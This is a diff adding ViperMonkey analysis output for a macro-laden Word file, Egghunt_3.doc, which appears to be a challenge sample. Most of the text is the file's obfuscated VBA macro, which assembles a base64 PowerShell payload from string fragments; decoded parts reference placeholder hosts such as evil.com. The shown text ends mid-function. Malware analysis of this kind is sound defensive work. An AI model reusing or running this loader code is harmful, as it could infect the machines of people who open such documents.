@@ -1,0 +1,4012 @@
+[*] User running on a Mac
+[*] Running 'docker ps' to see if script has required privileges to run...
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+[*] Pulling and starting container...
+latest: Pulling from haroldogden/vipermonkey
+Digest: sha256:433c88f2ff925f33d38486f394c069f6d16ca0172ef5a2d9a063192604f98e5a
+Status: Image is up to date for haroldogden/vipermonkey:latest
+docker.io/haroldogden/vipermonkey:latest
+[*] Attempting to copy file Egghunt_3.doc into container ID 79d892a2b1830625fa3fe578856848a9d0cdd6d3e2bb8bc379fc90b7ea8838ca
+[*] Starting openoffice listener for file content conversions...
+[*] Checking for ViperMonkey and dependency updates...
+[*] Disabling network connection for container ID 79d892a2b1830625fa3fe578856848a9d0cdd6d3e2bb8bc379fc90b7ea8838ca
+ _    ___                 __  ___            __             
+| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
+| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
+| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
+|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
+     /_/                                           /____/   
+vmonkey 1.0.2 - https://github.com/decalage2/ViperMonkey
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/ViperMonkey/issues
+
+===============================================================================
+FILE: /root/Egghunt_3.doc
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file:  - OLE stream: u'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file:  - OLE stream: u'Macros/VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+
+Function i_j1_Al()
+FN6a_c = ActiveDocument.CustomDocumentProperties("A5ScUi")
+jCm3n34 = ActiveDocument.CustomDocumentProperties("IFREzu_")
+BE_CHq = ActiveDocument.CustomDocumentProperties("DRk_qr")
+syd_m1v = ActiveDocument.CustomDocumentProperties("E9o__ZS")
+A_i_VMa = ActiveDocument.CustomDocumentProperties("tZ_8_Dl")
+E_lUtC = ActiveDocument.CustomDocumentProperties("giECYH")
+z_5_j_r = ActiveDocument.CustomDocumentProperties("CfVyxDf")
+OFFa4y = ActiveDocument.CustomDocumentProperties("svM_E_")
+yorYH9K = ActiveDocument.CustomDocumentProperties("pNETN__")
+mLrc4G = ActiveDocument.CustomDocumentProperties("Y9K__x")
+BNi_9X = ActiveDocument.CustomDocumentProperties("J3brf_")
+Yxbd_K_ = ActiveDocument.CustomDocumentProperties("w__2_f")
+kKTTVU_ = ActiveDocument.CustomDocumentProperties("wrPxkB")
+n_KO_lY = ActiveDocument.CustomDocumentProperties("Pz64_b")
+V_H7g9 = ActiveDocument.CustomDocumentProperties("nmc__bV")
+VNIiE_i = ActiveDocument.CustomDocumentProperties("QIvD3gu")
+Zz_I_S = ActiveDocument.CustomDocumentProperties("C7__j5")
+E5_F_3S = ActiveDocument.CustomDocumentProperties("eK4K_6")
+YARl_Ec = ActiveDocument.CustomDocumentProperties("Bs_yAkc")
+tMyDpp_ = ActiveDocument.CustomDocumentProperties("E_v_pGK")
+V_GG_P6 = ActiveDocument.CustomDocumentProperties("l__WB_")
+XYI76pM = ActiveDocument.CustomDocumentProperties("ORczDa")
+d3___J = ActiveDocument.CustomDocumentProperties("hnw_UA")
+V__1U_ = ActiveDocument.CustomDocumentProperties("cA_NX2")
+GmKIv__ = ActiveDocument.CustomDocumentProperties("R__38B")
+PO_XLaD = ActiveDocument.CustomDocumentProperties("ZuBWzB6")
+F_XF_Q = ActiveDocument.CustomDocumentProperties("xEUisS_")
+hBr__1 = ActiveDocument.CustomDocumentProperties("YsoBJ_")
+UIC_D_ = ActiveDocument.CustomDocumentProperties("CqyNk_b")
+ha_GR_ = ActiveDocument.CustomDocumentProperties("Aj_W3oi")
+t_yUqw = ActiveDocument.CustomDocumentProperties("EKt_S_w")
+M_Wl_5U = ActiveDocument.CustomDocumentProperties("w__bvGS")
+I23IPt_ = ActiveDocument.CustomDocumentProperties("oLo4s_V")
+vG_oi1 = ActiveDocument.CustomDocumentProperties("C7BqhT8")
+JGjh8O = ActiveDocument.CustomDocumentProperties("TG_5_4H")
+zfq_wO = ActiveDocument.CustomDocumentProperties("S_BzmC")
+jZigbW = ActiveDocument.CustomDocumentProperties("F_TO_j")
+qi30be = ActiveDocument.CustomDocumentProperties("CHvc1__")
+che0R_ = ActiveDocument.CustomDocumentProperties("GuZ_gr_")
+MnPAPeG = ActiveDocument.CustomDocumentProperties("oW_P2i")
+qKd_KYR = ActiveDocument.CustomDocumentProperties("BZiwMXE")
+XGkD__h = ActiveDocument.CustomDocumentProperties("cie35_I")
+LvjXOD = ActiveDocument.CustomDocumentProperties("rcR__CL")
+Ue_cYtw = ActiveDocument.CustomDocumentProperties("Q_PKU6")
+Teii_5s = ActiveDocument.CustomDocumentProperties("dSqV__")
+i_j1_Al = FN6a_c + jCm3n34 + BE_CHq + syd_m1v + A_i_VMa + E_lUtC + z_5_j_r + OFFa4y + yorYH9K + mLrc4G + BNi_9X + Yxbd_K_ + kKTTVU_ + n_KO_lY + V_H7g9 + VNIiE_i + Zz_I_S + E5_F_3S + YARl_Ec + tMyDpp_ + V_GG_P6 + XYI76pM + d3___J + V__1U_ + GmKIv__ + PO_XLaD + F_XF_Q + hBr__1 + UIC_D_ + ha_GR_ + t_yUqw + M_Wl_5U + I23IPt_ + vG_oi1 + JGjh8O + zfq_wO + jZigbW + qi30be + che0R_ + MnPAPeG + qKd_KYR + XGkD__h + LvjXOD + Ue_cYtw + Teii_5s + I_qTu_
+End Function
+Function sIy_rR_()
+If b3DiKMs Or rTUS_u Then
+' STRIPPED LINE
+End If
+If A_E____ Or A_t4O_I Then
+' STRIPPED LINE
+End If
+If JwI__F Or K_4Veys Then
+' STRIPPED LINE
+End If
+zjObKhS = "JABRAE" + "kAcwB" + "tAHQ" + "APQAnA" + "GUAdgB" + "pAGwA" + "LgBj" + "AG8"
+If n_m_8FA Or t__I9R_ Then
+' STRIPPED LINE
+End If
+If ut_SK2 Or Mz23z4_ Then
+' STRIPPED LINE
+End If
+If Z142_RW Or d8pH_o Then
+' STRIPPED LINE
+End If
+T_i9_p = "AbQ" + "AnADsA" + "JAB" + "qADYA" + "UgA"
+If SKxePt Or eKE_DEA Then
+' STRIPPED LINE
+End If
+If SVT7DzD Or p__yc_ Then
+' STRIPPED LINE
+End If
+goO_v_o = "5AEI" + "APQA" + "nAG" + "UAdg" + "BpAGw" + "ALgB" + "vAH"
+If hb2___X Or t_8f_VG Then
+' STRIPPED LINE
+End If
+KFXfKGr = "IAZw" + "AnADsA" + "JABp" + "AE0AN" + "gBQA" + "EkAZ"
+If k3_iQ3H Or b__Ueo Then
+' STRIPPED LINE
+End If
+If Zhr_uPj Or q_C_w__ Then
+' STRIPPED LINE
+End If
+Yj_Jb1 = "gBTADQ" + "AMAA9A" + "CcAdwB" + "oAGEA" + "dABpAH" + "MAbQB"
+If L_vWnG Or h_pfYu_ Then
+' STRIPPED LINE
+End If
+eT_V_1j = "5AGkAc" + "AAuAGM" + "AbwBt" + "ACcAO" + "wBTAH" + "YAIAA" + "gACgA" + "JwA"
+If P_BUg7d Or Cp_Ocyk Then
+' STRIPPED LINE
+End If
+O_Uz3E_ = "wAEI" + "ANwB1A" + "EMAMQ" + "BmA" + "FMAMwA"
+If JatX_6t Or zp_62uj Then
+' STRIPPED LINE
+End If
+Ix0qSw = "nACkAI" + "AAoA" + "FsA" + "dAB5AH" + "AAZQB" + "dACgA"
+If BPLTHy_ Or y_ZYEA Then
+' STRIPPED LINE
+End If
+If Dy_TG6D Or tzW_9_ Then
+' STRIPPED LINE
+End If
+zD_Jd_ = "IgB7" + "ADkAf" + "QB7" + "ADEAMQ" + "B9AHs"
+sIy_rR_ = zjObKhS + T_i9_p + goO_v_o + KFXfKGr + Yj_Jb1 + eT_V_1j + O_Uz3E_ + Ix0qSw + zD_Jd_
+If SXTYqSf Or JwKwbI Then
+' STRIPPED LINE
+End If
+If GRhXQTn Or u7nW__l Then
+' STRIPPED LINE
+End If
+End Function
+Function K6srFE()
+If dq_7_d Or Fh4Xcp Then
+' STRIPPED LINE
+End If
+If Uk_8k_v Or v9N7SL Then
+' STRIPPED LINE
+End If
+If f3igNT Or z__2wn Then
+' STRIPPED LINE
+End If
+A0__KfA = "ANw" + "B9AH" + "sAMw" + "B9AH" + "sAOA" + "B9AH" + "sANgB" + "9AHsA"
+If cS0sjoF Or t_x_5r Then
+' STRIPPED LINE
+End If
+If hN__r_1 Or uQhOJN_ Then
+' STRIPPED LINE
+End If
+UUiqq5 = "NAB9AH" + "sAMQ" + "AwAH0" + "AewAwA" + "H0AewA" + "0AH"
+If DTBSKg Or zdfi__U Then
+' STRIPPED LINE
+End If
+If nrVJGqU Or ON_Pc_ Then
+' STRIPPED LINE
+End If
+If jtBUTY8 Or kZ_c_Iu Then
+' STRIPPED LINE
+End If
+D_cP___ = "0Aew" + "AxAH" + "0Ae" + "wAy" + "AH0A" + "ewA1AH" + "0Ae"
+If MQCPQN Or dDFLb4 Then
+' STRIPPED LINE
+End If
+Ka_5yC = "wAxA" + "DIAf" + "QAiA" + "CAAL" + "QBmA"
+If BUSB_X3 Or KsFUfsP Then
+' STRIPPED LINE
+End If
+FBe_v__ = "CcA" + "bwA" + "nACwA" + "JwBGAC" + "cALA"
+If rx7IM_q Or TSmqiPh Then
+' STRIPPED LINE
+End If
+If CkQW6b Or k__m7gC Then
+' STRIPPED LINE
+End If
+c_jCr_ = "AnAGk" + "AJw" + "AsAC" + "cAVAA" + "nACwAJ" + "wAuAC" + "cAL"
+If iB_w___ Or M_wGY_Y Then
+' STRIPPED LINE
+End If
+N8_TXIr = "AAnAGw" + "AJw" + "AsACcA" + "TQAn" + "ACw" + "AJwBz" + "ACcALA" + "AnA"
+K6srFE = A0__KfA + UUiqq5 + D_cP___ + Ka_5yC + FBe_v__ + c_jCr_ + N8_TXIr
+If vsdo5Dq Or W_o_sF1 Then
+' STRIPPED LINE
+End If
+End Function
+Function u_rf6_()
+If kQx4pF Or SVS0Eb Then
+' STRIPPED LINE
+End If
+If nb_eWo Or ha_I_o1 Then
+' STRIPPED LINE
+End If
+If I__Jk5 Or eBN1A_3 Then
+' STRIPPED LINE
+End If
+bTOk__B = "GUAJ" + "wAsAC" + "cAUwAn" + "ACwAJw" + "BJA" + "CcA" + "LAAnA" + "HkAJ" + "wAsACc"
+If A_rcGtR Or hhx8dr Then
+' STRIPPED LINE
+End If
+If Gj_HYDp Or dZdq_N Then
+' STRIPPED LINE
+End If
+UP__9Aq = "ARQAnA" + "CkA" + "KQA" + "7ACQ" + "ARQBL"
+If Q_yQLtc Or jv27daK Then
+' STRIPPED LINE
+End If
+LXrK_iQ = "AGMA" + "MABZ" + "AHI" + "AeQ" + "BUAGIA" + "IAA9A"
+If Z4G6_X Or e_y__ZG Then
+' STRIPPED LINE
+End If
+If v_lo39 Or D2x6of_ Then
+' STRIPPED LINE
+End If
+If hPp_4V9 Or GO9_ngc Then
+' STRIPPED LINE
+End If
+SU4EQZ_ = "CAA" + "JABLAG" + "IAU" + "QA1AGQ" + "AaAB6"
+If s_1wBRs Or o_Ky___ Then
+' STRIPPED LINE
+End If
+If p__QN_t Or P___I_M Then
+' STRIPPED LINE
+End If
+Z__zlG = "ACAAK" + "wAgACQ" + "AYQB" + "yAG" + "cAc" + "wBbADA" + "AXQ" + "A7A"
+If hjUaxG_ Or O8u__Lt Then
+' STRIPPED LINE
+End If
+If UHjYq5 Or PRO6W63 Then
+' STRIPPED LINE
+End If
+If E_H7l38 Or yS_zD4P Then
+' STRIPPED LINE
+End If
+R_MtB6_ = "CQA" + "ZgA2AE" + "IAMAB4" + "AE8" + "AIA" + "A9ACAA" + "IgBpA"
+u_rf6_ = bTOk__B + UP__9Aq + LXrK_iQ + SU4EQZ_ + Z__zlG + R_MtB6_
+If mWKRDl_ Or EF7_5_y Then
+' STRIPPED LINE
+End If
+If w_pX_qT Or Zx_PqMj Then
+' STRIPPED LINE
+End If
+If vR_gB__ Or C_W_lZQ Then
+' STRIPPED LINE
+End If
+End Function
+Function uj_dg_U()
+If yjth_Q Or Q_SiA_o Then
+' STRIPPED LINE
+End If
+If WMnU1__ Or Qxn960V Then
+' STRIPPED LINE
+End If
+Y_BuR_R = "GYA" + "YwBvAG" + "4AZ" + "gBpAGc" + "ALgBtA"
+If Hb_1nG Or w7_4mYN Then
+' STRIPPED LINE
+End If
+If HkWykF Or MAm_VG Then
+' STRIPPED LINE
+End If
+u5_0_i = "GUAI" + "gA7" + "AHMA" + "VgA" + "gACAAK" + "AAnA" + "EgA" + "YwBvA" + "FUAU"
+If X_c_Ou Or FwEwbMy Then
+' STRIPPED LINE
+End If
+If zxB_99A Or X___Lo Then
+' STRIPPED LINE
+End If
+If bzmdur Or V__H6ei Then
+' STRIPPED LINE
+End If
+LQ9Kk9 = "QBQAC" + "cAKQ" + "AgACg" + "AWwB" + "0AHkA" + "UABlAF" + "0AKAAi" + "AHsA" + "NwB9"
+If P__U4_q Or Xe3mDE Then
+' STRIPPED LINE
+End If
+If yNo_B_ Or ra_JHy Then
+' STRIPPED LINE
+End If
+If CdhISP Or WH__t_7 Then
+' STRIPPED LINE
+End If
+cFX__ZD = "AHs" + "ANA" + "B9A" + "HsA" + "OQB9AH" + "sAM" + "QAwAH"
+If f_ulv6h Or pAj_yj Then
+' STRIPPED LINE
+End If
+If bGj___ Or H1_veFy Then
+' STRIPPED LINE
+End If
+nSgo_7_ = "0Ae" + "wA4AH0" + "AewA2A" + "H0AewA" + "1AH0A" + "ewAzAH"
+If Bz_py_S Or s_l___ Then
+' STRIPPED LINE
+End If
+If OV1_M_ Or q_46Ex Then
+' STRIPPED LINE
+End If
+If qFfeI_ Or gAU4ux Then
+' STRIPPED LINE
+End If
+Tih9ZZ = "0Ae" + "wAx" + "AH0" + "Aew" + "A1AH0A" + "ewAxAD" + "EAf"
+If H77_qG Or IwVg9__ Then
+' STRIPPED LINE
+End If
+FomYme = "QB7ADM" + "AfQB7" + "ADIA" + "fQB" + "7ADgAf" + "QB7"
+If jYb8b__ Or l_e_R__ Then
+' STRIPPED LINE
+End If
+If bTTs46 Or IiRc__B Then
+' STRIPPED LINE
+End If
+LGMxoL = "ADA" + "AfQB7" + "ADEA" + "MAB9" + "AHsAM" + "QB9A" + "HsAM"
+uj_dg_U = Y_BuR_R + u5_0_i + LQ9Kk9 + cFX__ZD + nSgo_7_ + Tih9ZZ + FomYme + LGMxoL
+If r_YJ_U Or q5WpEC2 Then
+' STRIPPED LINE
+End If
+If Fj_VRx_ Or URT8q__ Then
+' STRIPPED LINE
+End If
+End Function
+Function J_4QJ_()
+If J__TUR Or MuLq_D Then
+' STRIPPED LINE
+End If
+If BaTlaS Or H__66T Then
+' STRIPPED LINE
+End If
+If UJ_I_19 Or z_P__2 Then
+' STRIPPED LINE
+End If
+BGyE5_ = "gB9" + "AHsA" + "NAB9AC" + "IAIA" + "AtA" + "GYAJw" + "BDACcA"
+If nMS_Dw Or A___xe_ Then
+' STRIPPED LINE
+End If
+If U0X__u Or HZ_K_1w Then
+' STRIPPED LINE
+End If
+If N8Y_F1o Or u__VMz_ Then
+' STRIPPED LINE
+End If
+uVtss_ = "LAAn" + "AE8AJw" + "AsACc" + "AcgA" + "nACwA" + "JwBpAC" + "cALA"
+If e8_Bp_ Or C__zk7 Then
+' STRIPPED LINE
+End If
+If nXMjs_ Or Q_uLUyj Then
+' STRIPPED LINE
+End If
+Z4B_gv = "AnAFk" + "AJwAsA" + "CcAL" + "gAnACw" + "AJw" + "BNACc" + "ALAA" + "nAHMAJ" + "wAsA"
+If UL9K0U Or e47lH10 Then
+' STRIPPED LINE
+End If
+If VjvdeOw Or W2f_NVJ Then
+' STRIPPED LINE
+End If
+h_iO8_v = "CcAR" + "QAnA" + "CwAJw" + "BTA" + "CcAL" + "AAn" + "AHQAJ" + "wAsAC" + "cAZA"
+If U67zW__ Or h1Hwn_ Then
+' STRIPPED LINE
+End If
+If IN_2Prk Or V3upvJ Then
+' STRIPPED LINE
+End If
+xnI__h = "AnAC" + "kAK" + "QA7A" + "HMA" + "dgAgA"
+If Zr_5_Af Or ffFy_4C Then
+' STRIPPED LINE
+End If
+If F_8_sH Or AEcGYD_ Then
+' STRIPPED LINE
+End If
+mBu_Kav = "CgAJwB" + "JAEcA" + "egBwA" + "HkANQB" + "2AGE" + "ASQB" + "5AC" + "cAKQA" + "gACgA"
+If l___a1 Or aMQ_iy Then
+' STRIPPED LINE
+End If
+RD20_J6 = "WwB0A" + "HkAc" + "ABlA" + "F0AKA" + "AiAH" + "sAM" + "QAwAH" + "0AewAw" + "AH0Ae"
+If gF2F_U Or UuTDki Then
+' STRIPPED LINE
+End If
+If ZRkK_4 Or s8o5Km Then
+' STRIPPED LINE
+End If
+egM_dG = "wAxA" + "DAAfQ" + "B7AD" + "EAMQB9" + "AHs"
+If aVZFJS Or vg__MVN Then
+' STRIPPED LINE
+End If
+If npbrmB Or Nd_k6Sr Then
+' STRIPPED LINE
+End If
+If V2_y9E Or eg_dx3 Then
+' STRIPPED LINE
+End If
+qm_2zA = "AOAB9" + "AHsAM" + "wB9" + "AHsAM" + "QB9AHs"
+J_4QJ_ = BGyE5_ + uVtss_ + Z4B_gv + h_iO8_v + xnI__h + mBu_Kav + RD20_J6 + egM_dG + qm_2zA
+If vJXXp_ Or hLbXZvs Then
+' STRIPPED LINE
+End If
+If rIZ___I Or cv__y_ Then
+' STRIPPED LINE
+End If
+End Function
+Function lbRf9O_()
+If OY_xANI Or Prq_RE Then
+' STRIPPED LINE
+End If
+If lfi5__ Or JU_QC_m Then
+' STRIPPED LINE
+End If
+k_ETrb = "AMQ" + "A0AH0" + "AewAxA" + "DIA" + "fQB7A"
+If IV_924 Or xquOl0_ Then
+' STRIPPED LINE
+End If
+If R_kf__ Or xt_7P4X Then
+' STRIPPED LINE
+End If
+qQ_b8e = "DEAM" + "QB9AH" + "sAMQ" + "B9AHs" + "ANAB" + "9AHsA" + "OAB9" + "AHsA" + "NgB9AH"
+If NV86RhE Or arn0dqU Then
+' STRIPPED LINE
+End If
+If g_Bq_H Or G4ia7oB Then
+' STRIPPED LINE
+End If
+If g__i6U_ Or bXhIyV Then
+' STRIPPED LINE
+End If
+xe___4 = "sAN" + "wB9AH" + "sAO" + "QB9" + "AHsA"
+If qMZQW_ Or DTn_zd_ Then
+' STRIPPED LINE
+End If
+If yp_z_gX Or KY_6mRi Then
+' STRIPPED LINE
+End If
+If h_GBLzx Or DxEQ3_ Then
+' STRIPPED LINE
+End If
+v_but3 = "MQAz" + "AH0" + "AewA" + "4AH0A" + "ewA1AH" + "0AewAy"
+If H_Vkh5N Or z9tKkYj Then
+' STRIPPED LINE
+End If
+If g_E__KM Or JI_iQw Then
+' STRIPPED LINE
+End If
+cuk__JP = "AH0A" + "IgAgA" + "C0AZg" + "AnAFk" + "AJwAs" + "ACcALg" + "AnACwA" + "JwBUAC" + "cALAAn"
+If TAOHe6 Or tcfUTR_ Then
+' STRIPPED LINE
+End If
+If l_Gw9_ Or X5PDBr Then
+' STRIPPED LINE
+End If
+If cfWX8_ Or M4E7d_U Then
+' STRIPPED LINE
+End If
+n_A_Q_M = "AE0A" + "JwAsA" + "CcA" + "dwA" + "nACwAJ" + "wBOACc" + "ALAAnA" + "GIAJw" + "AsACc"
+If xTE__n Or CduJj__ Then
+' STRIPPED LINE
+End If
+If OPJrqL Or lW83r_f Then
+' STRIPPED LINE
+End If
+ozf__v_ = "AYwAn" + "ACwAJ" + "wBlA" + "CcALA" + "AnA" + "EwAJ" + "wAsA"
+If FdbdDP Or XP5S7B Then
+' STRIPPED LINE
+End If
+If aoYfYHe Or iB_A_MI Then
+' STRIPPED LINE
+End If
+Ma___V = "CcA" + "UwA" + "nACwAJ" + "wB0AC" + "cAL" + "AAnAE" + "UAJwAs" + "ACcA"
+If d__h6u Or U___54u Then
+' STRIPPED LINE
+End If
+If l_X_pI Or AP5__Y Then
+' STRIPPED LINE
+End If
+b_9R_e_ = "SQA" + "nAC" + "wAJw" + "BuACc" + "AKQAp" + "ADsAJA" + "B5AEM" + "ANAB"
+If RqzYfA Or Jw_xd__ Then
+' STRIPPED LINE
+End If
+If l_Gi5V_ Or SihZ_F Then
+' STRIPPED LINE
+End If
+I_k_rvD = "KAGkA" + "MgAg" + "AD0" + "AIA" + "AiA" + "GYAcg"
+lbRf9O_ = k_ETrb + qQ_b8e + xe___4 + v_but3 + cuk__JP + n_A_Q_M + ozf__v_ + Ma___V + b_9R_e_ + I_k_rvD
+If eOpYz6 Or j_P6__p Then
+' STRIPPED LINE
+End If
+If Zm_SHUQ Or x_m1E_ Then
+' STRIPPED LINE
+End If
+If B0_M_X4 Or f3V754 Then
+' STRIPPED LINE
+End If
+End Function
+Function Wm_W_6()
+If jnXHEhG Or zjm_Mu Then
+' STRIPPED LINE
+End If
+If vpE_5E Or Pl_e61t Then
+' STRIPPED LINE
+End If
+If G_11jT Or ZIt5uk Then
+' STRIPPED LINE
+End If
+V_uBP_ = "BlAG" + "UAZ" + "wBlAG8" + "AaQBw" + "AC4AY" + "QBwAH" + "AAIgA" + "7AC"
+If w_r_wX_ Or cU6Pmem Then
+' STRIPPED LINE
+End If
+If p0_3_i_ Or yH5p_Yu Then
+' STRIPPED LINE
+End If
+If CaJ7JTf Or ilL9xX Then
+' STRIPPED LINE
+End If
+I1C9xu7 = "QAZQA" + "zAGYA" + "MQA" + "1AD" + "kAIAA"
+If LV9H9U Or V__Glei Then
+' STRIPPED LINE
+End If
+a_z7_H = "9ACA" + "AJABq" + "ADY" + "AUgA5A" + "EIAIAA" + "rAC"
+If A2hZ__ Or yAXRgD_ Then
+' STRIPPED LINE
+End If
+If URp_uW Or XZLhFi7 Then
+' STRIPPED LINE
+End If
+If r_3L_nA Or U_dbPb_ Then
+' STRIPPED LINE
+End If
+XH2oS4G = "AAJA" + "BJA" + "FAA" + "dQB1AH" + "YANg" + "BOAD" + "sAJ" + "ABJ"
+If AS_Bda Or Y_fyZlv Then
+' STRIPPED LINE
+End If
+fmq___ = "AFAA" + "dQB1" + "AHYANg" + "BOAC" + "AAPQAg" + "ACIA" + "bwB4AG" + "0AbA" + "B4A"
+If K_____ Or vm_nA_ Then
+' STRIPPED LINE
+End If
+d2dT_K = "G0Ab" + "ABvAHg" + "AbQB" + "sACI" + "ALgB" + "yAGUAc"
+If W___eo Or Enh_2B_ Then
+' STRIPPED LINE
+End If
+dMTAD8Q = "ABs" + "AGEAYw" + "BlA" + "CgAKAA" + "iAG8AI" + "gArACI"
+If br_1su Or Dd43M_Q Then
+' STRIPPED LINE
+End If
+If pNDnV_ Or P5gll1 Then
+' STRIPPED LINE
+End If
+e_i_Nn_ = "AeABt" + "ACIA" + "KwAiA" + "GwAI" + "gApACw" + "AWwBz"
+If atV9uV Or d_w_Kj Then
+' STRIPPED LINE
+End If
+If i1ixw_z Or X6e4Q_s Then
+' STRIPPED LINE
+End If
+If G_xZ_e_ Or VnTB_u_ Then
+' STRIPPED LINE
+End If
+Tht_Ik = "AHQA" + "cgBp" + "AG4AZ" + "wBdAFs" + "AYwBoA"
+If OXZA_w Or TzG1h_7 Then
+' STRIPPED LINE
+End If
+If fAy_P_ Or lFm_jM Then
+' STRIPPED LINE
+End If
+Tv_5RDP = "GEAcg" + "BdADQA" + "NwApAD" + "sAJA" + "AyAFQA"
+Wm_W_6 = V_uBP_ + I1C9xu7 + a_z7_H + XH2oS4G + fmq___ + d2dT_K + dMTAD8Q + e_i_Nn_ + Tht_Ik + Tv_5RDP
+If PqO_dp Or so9TR__ Then
+' STRIPPED LINE
+End If
+End Function
+Function Hf_T7sK()
+If Ae_U7_5 Or k_gkI_ Then
+' STRIPPED LINE
+End If
+If e17__k Or tk_Rz3c Then
+' STRIPPED LINE
+End If
+If Snvxhx_ Or aflXY_ Then
+' STRIPPED LINE
+End If
+qMr19EB = "dwB" + "PAE" + "4ARgB" + "aAC" + "AAP" + "QAgAC" + "QAeQB"
+If zZo_o_ Or lY05WM_ Then
+' STRIPPED LINE
+End If
+If Veyf__ Or v2_lpF Then
+' STRIPPED LINE
+End If
+If ifM0bo Or q_3hAG Then
+' STRIPPED LINE
+End If
+dnO5J_ = "DADQA" + "SgBpA" + "DIAI" + "AArAC" + "AAJ" + "ABJAF"
+If RH72txE Or C_B___h Then
+' STRIPPED LINE
+End If
+If dBB9_R Or S9icTG Then
+' STRIPPED LINE
+End If
+bicJ_I = "AAdQ" + "B1AHYA" + "NgBO" + "ADsAaQ" + "BmAC" + "gAV"
+If v_L_US_ Or Xy_D_5 Then
+' STRIPPED LINE
+End If
+M_mTP_N = "ABl" + "AHM" + "AdAAt" + "AEM" + "AbwB" + "uAG" + "4AZQBj" + "AHQAaQ"
+If lkAyeAD Or cwAn1__ Then
+' STRIPPED LINE
+End If
+V9Q_hm = "BvAG4" + "AIAAt" + "AFEAdQ" + "BpAGU" + "AdAAg" + "ACQAU"
+If jqD__o Or a8___d Then
+' STRIPPED LINE
+End If
+d6Qc_4k = "QBJAHM" + "AbQB0" + "ACkA" + "ewBlAH" + "gAaQB" + "0AH0" + "AZQBsA"
+If g4U4_c Or U_7Rj7 Then
+' STRIPPED LINE
+End If
+If APnL_Dc Or b_iAg2 Then
+' STRIPPED LINE
+End If
+N_B_b7_ = "HMAZ" + "QB7" + "AGkA" + "ZgAoAF" + "QAZQ" + "BzAH" + "QAL"
+If z4ZH_a Or Fw_c8pY Then
+' STRIPPED LINE
+End If
+If G__7PK Or v73rfN Then
+' STRIPPED LINE
+End If
+b_8_ec_ = "QBDAG8" + "AbgBu" + "AGU" + "AYwB" + "0AGk" + "AbwBu"
+If k6O_f_ Or cWou_b Then
+' STRIPPED LINE
+End If
+I_dTb5 = "ACA" + "ALQBRA" + "HUA" + "aQB" + "lAHQA" + "IAAkA" + "GoANgB"
+Hf_T7sK = qMr19EB + dnO5J_ + bicJ_I + M_mTP_N + V9Q_hm + d6Qc_4k + N_B_b7_ + b_8_ec_ + I_dTb5
+If wk9_wj Or lU_zcld Then
+' STRIPPED LINE
+End If
+If KEAC9Lw Or Pj8mO_q Then
+' STRIPPED LINE
+End If
+If h__Q5mO Or nr_d9Kk Then
+' STRIPPED LINE
+End If
+End Function
+Function Bs___dW()
+If UxO_Ys Or pz9m8_V Then
+' STRIPPED LINE
+End If
+r__OKm = "SAD" + "kAQgAp" + "AHs" + "AJABjA" + "FIAYgB"
+If b7HJ_x Or iIL3G_ Then
+' STRIPPED LINE
+End If
+If P_Dwp__ Or ocALMf_ Then
+' STRIPPED LINE
+End If
+Vw_SWu = "jAG8AN" + "gBxADE" + "AUgBW" + "AD0AIA" + "AoACg" + "AJwBoA" + "HQAJw"
+If jQ_f1W Or Awjn1P5 Then
+' STRIPPED LINE
+End If
+U_wIu_9 = "ArA" + "CgAJwA" + "nACsAJ" + "wBBAD" + "gAaAB" + "xACkAK" + "AA2A" + "EEAJw" + "ArACcA"
+If yF0TlG Or kuMAnkv Then
+' STRIPPED LINE
+End If
+If n8n_05 Or zB0we9 Then
+' STRIPPED LINE
+End If
+WnC5__ = "MwBjA" + "CcAKQ" + "ArACcA" + "dABwAH" + "MAO" + "gAnA" + "CsA"
+If rIUi_E4 Or t_kFBK Then
+' STRIPPED LINE
+End If
+bzGEpA = "KAAn" + "AEEAOA" + "AnACs" + "AJwBoA" + "HEAK" + "QAoA" + "DYAJwA"
+If DwDxf7_ Or r_UG__W Then
+' STRIPPED LINE
+End If
+If FpFD_3 Or u_uq_i Then
+' STRIPPED LINE
+End If
+If Tvxe__ Or Vjdl_ER Then
+' STRIPPED LINE
+End If
+nF___B7 = "rACcAQ" + "QAz" + "AGMAJ" + "wApAC" + "sAJ" + "wAn" + "ACsAJw" + "BxAF" + "8AeAA9"
+If b7aPl4 Or WJ_m_NO Then
+' STRIPPED LINE
+End If
+If d_CfYm Or Jg___e Then
+' STRIPPED LINE
+End If
+If tdLTKa Or k__hp_ Then
+' STRIPPED LINE
+End If
+oi_PnY = "AHEAcQ" + "BfAHgA" + "PQBxA" + "GgAJ" + "wArA" + "CcAZQB" + "sAH"
+If MK_T3v_ Or fw5_h3_ Then
+' STRIPPED LINE
+End If
+V77c_if = "MAJwAr" + "ACgAJ" + "wBB" + "ADgAa" + "ABx" + "ACkAK" + "AA2A" + "EEAMw" + "BjAC"
+If fpVN_NY Or Q__Ef2 Then
+' STRIPPED LINE
+End If
+If U_Ikz_1 Or e_7___t Then
+' STRIPPED LINE
+End If
+If v6PW6_5 Or p__4___ Then
+' STRIPPED LINE
+End If
+w_w_QA5 = "cAKQ" + "ArACc" + "AJwAr" + "ACcAZ" + "QBjACc"
+If O__q6R Or mm_x_m Then
+' STRIPPED LINE
+End If
+If E0f_Fn_ Or oVD_vG_ Then
+' STRIPPED LINE
+End If
+If EocIn_d Or A2x_Xz6 Then
+' STRIPPED LINE
+End If
+O_jGETx = "AKw" + "AoACcA" + "QQA" + "nACs" + "AJwA4"
+If aG_ner Or P4W___ Then
+' STRIPPED LINE
+End If
+N_e__T = "AGgA" + "cQApAC" + "gAJwAr" + "ACcAN" + "gBBA" + "DMAYwA"
+If OcQ6JI Or uADtu1T Then
+' STRIPPED LINE
+End If
+If q_9__Aj Or F1Z_k_ Then
+' STRIPPED LINE
+End If
